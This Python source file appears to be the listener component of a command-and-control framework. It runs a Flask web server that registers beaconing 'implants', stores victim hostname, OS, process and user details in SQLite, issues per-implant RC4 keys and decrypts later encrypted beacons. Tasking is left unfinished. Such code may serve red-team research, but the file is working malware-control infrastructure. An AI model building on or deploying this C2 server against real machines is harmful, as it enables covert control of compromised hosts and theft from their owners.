import base64
import datetime
import logging
import json
import random
import sqlite3
import string
from core.config import *
from core.message import *
from gevent.wsgi import WSGIServer
from flask import Flask, request, redirect
from logging.handlers import RotatingFileHandler

# creates Flask app
app = Flask(__name__)
app.debug = True


class WebServer(object):

    def __init__(self):
        # tries to open sqlite connection
        try:
            # uses database path specified in "config.py"
            self.connection = sqlite3.connect(database_path)

        # exception raised during sqlite connection
        except Exception:
            raise

    def crypt(self, key, data):
        """
        DESCRIPTION:
            This function is the encryption and decryption routine
        """
        S = list(range(256))
        j = 0
        out = []

        for i in list(range(256)):
            j = (j + S[i] + ord(key[i % len(key)])) % 256
            S[i], S[j] = S[j], S[i]

        i = j = 0

        for char in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            out.append(chr(char ^ S[(S[i] + S[j]) % 256]))

        return "".join(out)

    def is_base64(self, string):
        """
        DESCRIPTION:
            This function checks if a specified string is Base64 encoded or not
        """
        # tries to Base64 decode
        try:
            base64.b64decode(string).decode()
            return True

        # exception raised during Base64 decode
        except Exception:
            return False

    def beacon_response(self):
        """
        DESCRIPTION:
            This function is called when an implant beacons
        """
        # gets raw POST data
        raw_data = request.get_data()

        # if initial Base64 beacon
        # new beacon
        if self.is_base64(raw_data) is True:
            # Base64 decodes POST data
            decoded = base64.b64decode(raw_data).decode()

            # parses JSON POST data
            j = json.loads(decoded)
            hostname = j["h"]
            operating_system = j["o"]
            process_id = j["p"]
            current_user = j["u"]

            # gets current time (uses server's time)
            now = datetime.datetime.now()
            current_time = now.strftime("%Y-%m-%d %H:%M:%S")

            # generates a random 32 character encryption key
            # (upper and lower, no numbers)
            key = "".join(random.SystemRandom().choice(string.ascii_letters)
                          for _ in range(32))

            # INSERTS an entry into the "implants" table
            with self.connection:
                cursor = self.connection.cursor()
                cursor.execute("INSERT INTO implants VALUES (?,?,?,?,?,?)",
                               (hostname,
                                operating_system,
                                process_id,
                                current_user,
                                key,
                                current_time))

            # returns Base64 encoded encryption key in the HTTP response
            return base64.b64encode(key.encode())

        # else RC4 encrypted beacon
        else:
            # queries all encryption keys from the "implants" table
            with self.connection:
                cursor = self.connection.cursor()
                cursor.execute("SELECT encryption_key FROM implants")
                results = cursor.fetchall()

                # loops through each encryption key
                # tries to decrypt using each key
                for row in results:
                    # if successful decryption
                    if "hostname" in self.crypt(row[0], raw_data):
                        # JSON decodes POST data
                        j = json.loads(self.crypt(row[0], raw_data))

                        hostname = j["hostname"]
                        current_user = j["current_user"]
                        process_id = j["process_id"]
                        operating_system = j["operating_system"]

                        # DEBUGGING
                        print(hostname)
                        print(current_user)
                        print(process_id)
                        print(operating_system)

                        # TO DO: updates last_beacon time in "implants" table

                        # TO DO: checks for tasking

            return "RC4 beacon"

    def start_flask_server(self, protocol, external_address, port, profile):
        """
        DESCRIPTION:
            This function starts the Flask web server
        """
        # tries to start the Flask web server
        try:
            # reads profile as a file
            with open(profile) as file:
                j = json.load(file)

            # adds beacon route for Flask
            app.add_url_rule(j["implant"]["beacon_uri"],
                             None,
                             self.beacon_response,
                             methods=["POST"])

            # configures Flask logging with 100 meg max file size
            # all requests are logged to "listener/logs/access.log"
            log_handler = RotatingFileHandler("logs/access.log",
                                              maxBytes=100000000,
                                              backupCount=3)
            app.logger.addHandler(log_handler)
            app.logger.setLevel(logging.INFO)

            # INSERTS an entry into the "listeners" table
            with self.connection:
                cursor = self.connection.cursor()
                cursor.execute("INSERT INTO listeners VALUES (?,?,?,?)",
                               (protocol,
                                external_address,
                                port,
                                profile))

            # starts Flask web server
            server = WSGIServer(("0.0.0.0", port), app, log=app.logger)
            print_status("[+] Started listener on tcp/" + str(port))
            server.serve_forever()

        # ignores KeyboardInterrupt exception
        except KeyboardInterrupt:
            pass

        # exception raised starting the Flask web server
        except Exception:
            raise

        # finally deletes all entries from "listeners" table
        # and closes sqlite connection opened in __init__()
        finally:
            # deletes all entries from "listeners" table
            with self.connection:
                cursor = self.connection.cursor()
                cursor.execute("DELETE FROM listeners")

            # closes sqlite connection opened in __init__()
            self.connection.close()
